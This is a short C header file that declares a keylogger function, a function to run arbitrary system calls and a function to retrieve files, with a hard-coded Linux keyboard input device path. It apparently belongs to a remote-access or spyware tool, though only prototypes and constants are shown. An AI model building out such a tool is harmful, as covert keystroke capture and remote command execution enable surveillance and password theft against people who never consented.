#ifndef FUNCTIONALITY_H
#define FUNCTIONALITY_H

//#include "parseKey.h"
#include "sharedLibrary.h"

#ifdef __linux__
#include <linux/input.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#endif

#define KEYBOARD_DEVICE "/dev/input/event2"
#define KEY_RELEASE 0
#define KEY_PRESS 1
#define KEY_HELD 2

void executeSystemCall(char *command);
void retrieveFile(char *file);
void keylogger();

#endif

